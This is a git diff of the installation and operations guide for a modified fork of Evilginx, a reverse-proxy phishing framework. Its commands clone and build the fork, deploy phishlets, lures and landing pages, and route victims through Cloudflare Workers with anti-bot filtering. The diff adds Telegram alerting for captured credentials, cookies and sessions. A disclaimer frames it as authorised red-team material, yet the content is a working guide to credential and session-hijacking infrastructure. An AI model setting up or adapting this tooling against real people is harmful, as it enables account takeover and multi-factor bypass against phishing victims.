@@ -4,6 +4,8 @@
 
 > **⚠️ LEGAL DISCLAIMER**: This guide is for **AUTHORIZED PENETRATION TESTING AND RED TEAM ENGAGEMENTS ONLY**. Unauthorized use is illegal. Always obtain written permission before conducting security assessments.
 
+**Repository:** [github.com/XcloudManiac67/Evilginxmod3](https://github.com/XcloudManiac67/Evilginxmod3)
+
 ---
 
 ## 📑 Table of Contents
@@ -143,12 +145,12 @@ echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
 
 ```bash
 # Create directory
-mkdir -p ~/phishing
-cd ~/phishing
+mkdir -p ~/phat
+cd ~/phat
 
-# Clone Evilginx3 (Private Dev Edition)
-git clone https://github.com/0fukuAkz/Evilginx3.git
-cd Evilginx3
+# Clone Evilginxmod3 (Private Dev Edition)
+git clone https://github.com/XcloudManiac67/Evilginxmod3.git
+cd Evilginxmod3
 ```
 
 ### 5.2 Linux Automated Installer (Recommended)
@@ -170,7 +172,7 @@ sudo ./install.sh
 - ✅ Stops and disables conflicting services (apache2, nginx, bind9, systemd-resolved)
 - ✅ Disables systemd-resolved and writes static `/etc/resolv.conf` (frees port 53)
 - ✅ Builds Evilginx from source (`CGO_ENABLED=1 go build -mod=vendor`)
-- ✅ Installs binary, phishlets, redirectors, post-redirectors, web UI, GoPhish static files, GeoIP DB, and documentation to `/opt/evilginx/`
+- ✅ Installs binary, phishlets, redirectors, post-redirectors, landing pages, web UI, GoPhish static files, GeoIP DB, and documentation to `/opt/evilginx/`
 - ✅ Creates system-wide wrapper at `/usr/local/bin/evilginx` (auto-loads paths)
 - ✅ Sets `CAP_NET_BIND_SERVICE` capability (bind ports 53/80/443 without root)
 - ✅ Configures UFW firewall (ports 22, 53, 80, 443, 2030, 3333)
@@ -212,7 +214,7 @@ For Windows 10/11 or Server 2016+.
 
 ```powershell
 # Open PowerShell as Administrator
-cd C:\path\to\Evilginx3
+cd C:\path\to\Evilginxmod3
 .\install-windows.ps1
 ```
 
@@ -220,7 +222,7 @@ cd C:\path\to\Evilginx3
 
 - ✅ Installs Go 1.25.7 (if missing)
 - ✅ Builds from source (`CGO_ENABLED=1 go build -mod=vendor`)
-- ✅ Installs binary, phishlets, redirectors, post-redirectors, web UI, GoPhish static files, and documentation to `C:\Evilginx\`
+- ✅ Installs binary, phishlets, redirectors, post-redirectors, landing pages, web UI, GoPhish static files, and documentation to `C:\Evilginx\`
 - ✅ Installs NSSM and creates a Windows Service with auto-start and log rotation
 - ✅ Configures Windows Firewall (ports 53, 80, 443, 2030, 3333)
 - ✅ Creates helper scripts: `evilginx-start`, `evilginx-stop`, `evilginx-restart`, `evilginx-status`, `evilginx-logs`, `evilginx-console`
@@ -252,7 +254,7 @@ sudo apt install -y build-essential libsqlite3-dev
 # Build
 # CGO_ENABLED=1 is required — go-sqlite3 uses CGo
 # -mod=vendor uses the checked-in vendor/ directory (no network needed)
-cd Evilginx3
+cd Evilginxmod3
 mkdir -p build
 CGO_ENABLED=1 go build -mod=vendor -o build/evilginx main.go
 
@@ -267,9 +269,11 @@ sudo setcap 'cap_net_bind_service=+ep' /usr/local/bin/evilginx
 mkdir -p ~/.evilginx/phishlets
 mkdir -p ~/.evilginx/redirectors
 mkdir -p ~/.evilginx/post_redirectors
+mkdir -p ~/.evilginx/landing_pages
 cp -r phishlets/* ~/.evilginx/phishlets/
 cp -r redirectors/* ~/.evilginx/redirectors/
 cp -r post_redirectors/* ~/.evilginx/post_redirectors/
+cp -r landing_pages/* ~/.evilginx/landing_pages/
 
 # Copy web UI and GoPhish static files
 cp -r web ~/.evilginx/web
@@ -280,15 +284,16 @@ cp -r gophish/static ~/.evilginx/static
 
 ```bash
 # Build image
-docker build -t evilginx3 .
+docker build -t evilginxmod3 .
 
 # Run container
 docker run -it \
   -p 443:443 -p 80:80 -p 53:53/udp \
   -p 2030:2030 -p 3333:3333 \
   -v $(pwd)/phishlets:/root/phishlets \
+  -v $(pwd)/landing_pages:/root/landing_pages \
   -v ~/.evilginx:/root/.evilginx \
-  evilginx3
+  evilginxmod3
 ```
 
 ---
@@ -307,7 +312,7 @@ Evilginx3 uses **CertMagic** for automatic certificate management via Let's Encr
 
    ```bash
    domains set yourdomain.com
-   config ipv4 YOUR_VPS_IP
+   config ipv4 external YOUR_VPS_IP
    ```
 
 Certificates will be automatically requested and installed for any phishlet hostname you enable.
@@ -472,7 +477,7 @@ Domain Pool:
 #### Step 2: Set External IP
 
 ```bash
-config ipv4 <YOUR_VPS_IP>
+config ipv4 external <YOUR_VPS_IP>
 ```
 
 #### Step 3: Configure the Phishlet
@@ -675,7 +680,7 @@ lures get-url 2    # Send to executives
 
 ## 11. Cloudflare Workers Deployment
 
-The Cloudflare Workers module provides **worker script generation, API-based deployment, and lifecycle management** directly from the Evilginx3 CLI. Workers run on Cloudflare's edge network and redirect visitors to the phishing infrastructure while applying filtering, anti-bot checks, and fingerprinting.
+The Cloudflare Workers module provides **worker script generation, API-based deployment, and lifecycle management** directly from the Evilginx CLI. Workers run on Cloudflare's edge network and redirect visitors to the phishing infrastructure while applying filtering, anti-bot checks, and fingerprinting.
 
 ### Source Files
 
@@ -718,7 +723,7 @@ The Cloudflare Workers module provides **worker script generation, API-based dep
 
 #### Method 1: CLI Auto-Deploy (Recommended)
 
-Deploy workers directly from the Evilginx3 shell using the Cloudflare API.
+Deploy workers directly from the Evilginx shell using the Cloudflare API.
 
 ##### Step 1: Configure Credentials
 
@@ -1011,16 +1016,16 @@ antibot spoof_url https://google.com
 
 A built-in JSON API and web dashboard run automatically on port **2030**, providing full remote management of phishlets, lures, sessions, config, and users.
 
-> **Security:** Port 2030 binds to `0.0.0.0` (all interfaces) over **HTTP only** — traffic is unencrypted. The installer opens it to the internet via UFW. Harden before exposing to the network:
+> **Security:** The Web Admin API binds to **`127.0.0.1:2030` only** (localhost) over HTTP. It is not reachable from the internet unless you forward it (SSH tunnel or Cloudflare Tunnel). The installer opens port 2030 in UFW for tunnel/operator workflows — use one of the options below:
 
 ```bash
-# Restrict port 2030 to your operator IP only
-sudo ufw delete allow 2030/tcp
-sudo ufw allow from YOUR_OPERATOR_IP to any port 2030
-
-# Or use an SSH tunnel instead of exposing the port at all
+# Recommended: SSH tunnel (no public exposure)
 ssh -L 2030:127.0.0.1:2030 root@YOUR_VPS_IP
 # Then open http://localhost:2030 in your browser
+
+# Optional: restrict UFW if you run a reverse proxy on this port
+sudo ufw delete allow 2030/tcp
+sudo ufw allow from YOUR_OPERATOR_IP to any port 2030
 ```
 
 **Default credentials** are printed to stdout on first start:
@@ -1076,10 +1081,36 @@ GET /api/audit?limit=200
 
 ### Telegram Notifications
 
-Real-time alerts can be sent directly to your Telegram bot whenever credentials or cookies are captured.
+Real-time alerts can be sent directly to your Telegram bot whenever credentials, cookies, or session captures occur.
 
-- Enable via: `config telegram enabled true`
-- Test configuration: `config telegram test`
+1. **Create a bot in Telegram**
+   - Open Telegram and start a chat with `@BotFather`
+   - Send: `/newbot`
+   - Choose a bot name and username
+   - Copy the bot token from BotFather: `123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ`
+
+2. **Get your chat ID**
+   - For a personal chat, send a message to your bot first, then use `@get_id_bot` or a similar service.
+   - For a group chat, add the bot to the group and use the same `@get_id_bot` service to obtain the group ID.
+   - Example chat ID formats: `123456789` or `-1001234567890`
+
+3. **Configure Telegram in Evilginx**
+
+```bash
+config telegram bot_token <your_bot_token>
+config telegram chat_id <your_chat_id>
+config telegram enabled true
+config telegram test
+```
+
+4. **Verify delivery**
+   - Run `config telegram test`
+   - Confirm the bot sends a test message to your chat
+
+5. **Best practices**
+   - Use a dedicated bot account for notifications
+   - Keep the bot token private
+   - Use a private group or direct chat for sensitive alerts
 
 ### GoPhish Integration
 
